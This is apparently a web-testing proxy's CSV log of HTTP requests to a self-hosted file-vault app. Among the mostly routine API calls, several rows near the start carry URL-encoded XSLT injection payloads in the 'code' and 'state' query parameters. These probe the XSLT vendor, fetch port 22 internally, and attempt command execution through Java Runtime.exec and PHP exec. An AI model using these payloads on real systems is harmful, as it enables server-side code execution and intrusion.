ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5954,Sat May 23 22:24:04 WIB 2026,Sat May 23 22:24:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,218,1143,464
5955,Sat May 23 22:24:04 WIB 2026,Sat May 23 22:24:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5956,Sat May 23 22:24:04 WIB 2026,Sat May 23 22:24:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,22,1324,30
5957,Sat May 23 22:24:04 WIB 2026,Sat May 23 22:24:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,26,1236,73
5958,Sat May 23 22:24:04 WIB 2026,Sat May 23 22:24:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Frichardgatewayta.duckdns.org%3A22%27%29%22%2F%3E&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,25,1143,464
5959,Sat May 23 22:24:04 WIB 2026,Sat May 23 22:24:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5960,Sat May 23 22:24:10 WIB 2026,Sat May 23 22:24:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3C,200,OK,999,1143,464
5961,Sat May 23 22:24:11 WIB 2026,Sat May 23 22:24:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,19,1143,464
5962,Sat May 23 22:24:11 WIB 2026,Sat May 23 22:24:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,235,1143,464
5963,Sat May 23 22:24:16 WIB 2026,Sat May 23 22:24:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Frichardgatewayta.duckdns.org%3A22%27%29%22%2F%3E,200,OK,1239,1143,464
5964,Sat May 23 22:24:18 WIB 2026,Sat May 23 22:24:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,18,1143,464
5965,Sat May 23 22:24:18 WIB 2026,Sat May 23 22:24:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,220,1143,464
5966,Sat May 23 22:24:16 WIB 2026,Sat May 23 22:24:18 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1700,1236,73
5967,Sat May 23 22:24:16 WIB 2026,Sat May 23 22:24:18 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,1712,1236,41
5968,Sat May 23 22:24:23 WIB 2026,Sat May 23 22:24:25 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1505,1236,73
5970,Sat May 23 22:24:45 WIB 2026,Sat May 23 22:24:47 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,1553,1069,25
5971,Sat May 23 22:24:47 WIB 2026,Sat May 23 22:24:47 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,72,1069,25
5972,Sat May 23 22:24:47 WIB 2026,Sat May 23 22:24:47 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,105,1171,25
5973,Sat May 23 22:24:47 WIB 2026,Sat May 23 22:24:47 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,19,758,156
5974,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,20,1143,464
5975,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,19,1069,25
5976,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,21,1069,25
5977,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,20,1171,25
5978,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,19,758,156
5979,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,105,1143,464
5980,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,24,1143,464
5981,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,128,1143,464
5982,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/,200,OK,130,1143,464
5983,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,360,1236,73
5985,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,369,1236,41
5986,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,368,1324,30
5987,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,370,1245,39
5988,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,241,1069,25
5989,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,244,1143,464
5990,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/,200,OK,244,1143,464
5991,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,232,1236,41
5992,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,237,1324,30
5993,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,236,1069,25
5994,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,237,1245,39
5995,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,241,1069,25
5996,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,242,1143,464
5997,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,486,1143,464
5998,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/,200,OK,246,1143,464
5999,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
6000,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:48 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,25,1324,30
6001,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,245,1069,25
6002,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,250,1245,39
6003,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,483,1236,73
6004,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,241,1236,41
6006,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,233,1324,30
6007,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,259,1171,25
6008,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,255,1143,464
6009,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/,200,OK,253,1143,464
6010,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,256,1143,464
6011,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,19,1069,25
6012,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,19,1245,39
6013,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
6014,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,238,1324,30
6015,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/usage,200,OK,245,1164,69
6016,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,239,1069,25
6017,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,238,1236,41
6018,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,250,758,156
6019,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,247,1245,39
6020,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,259,1171,25
6021,Sat May 23 22:24:48 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,520,1069,25
6022,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,483,1143,464
6023,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,489,1069,25
6024,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,503,1324,30
6025,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/usage,200,OK,490,1164,69
6026,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,487,1236,41
6027,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,743,1171,144891
6028,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,487,1245,39
6030,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,485,1069,25
6031,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,486,1171,25
6032,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,264,1143,464
6033,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,711,1236,73
6035,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/usage,200,OK,245,1164,69
6036,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,245,1324,30
6037,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,247,1069,25
6038,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,260,1236,41
6039,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,200,OK,1003,1162,2
6040,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/notifications,200,OK,1005,1162,2
6041,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,428,1236,73
6043,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,200,OK,1233,1243,2
6044,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,488,1245,39
6045,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,495,1171,25
6046,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,495,1069,25
6047,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/identity,500,Internal Server Error,1243,1183,33
6048,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,498,1143,464
6049,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/,200,OK,1245,1143,464
6050,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,1249,1143,464
6051,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/usage,200,OK,268,1164,69
6052,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,268,1324,30
6053,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,270,1069,25
6054,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,200,OK,252,1162,2
6055,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,254,1236,41
6056,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/notifications,200,OK,250,1162,2
6057,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:49 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,200,OK,490,1215,464
6059,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,693,1171,145054
6061,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,275,1245,39
6062,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets/index-CPrzggVV.css,200,OK,1254,1215,3669
6063,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,200,OK,278,1243,2
6064,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/usage,200,OK,479,1164,69
6065,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/identity,500,Internal Server Error,488,1183,33
6066,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,477,1069,25
6067,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,200,OK,481,1162,2
6068,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,485,1324,30
6069,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,482,1236,41
6070,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/notifications,200,OK,482,1162,2
6071,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,480,1236,73
6073,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,502,1069,25
6074,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,502,1171,25
6075,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/,200,OK,499,1143,464
6076,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,497,1143,464
6077,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080,200,OK,501,1143,464
6078,Sat May 23 22:24:49 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/favicon.svg,200,OK,1494,1134,9522
6079,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,244,1245,39
6080,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:50 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,200,OK,246,1243,2
6081,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets/index-CPrzggVV.css,200,OK,493,1215,3669
6082,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/identity,500,Internal Server Error,268,1183,33
6083,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,269,1069,25
6084,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/usage,200,OK,270,1164,69
6085,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,200,OK,267,1162,2
6086,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,266,1324,30
6087,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/notifications,200,OK,267,1162,2
6088,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,268,1236,41
6089,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,717,1171,145380
6091,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,450,1236,73
6093,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,200,OK,487,1243,2
6094,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,DELETE,https://richardgatewayta.duckdns.org:8080/api/v1/vault/trash,400,Bad Request,732,1245,39
6095,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,746,1171,25
6096,Sat May 23 22:24:50 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,748,1069,25
6097,Sat May 23 22:24:51 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault/notifications,200,OK,486,1162,2
6098,Sat May 23 22:24:51 WIB 2026,Sat May 23 22:24:51 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,494,1069,25
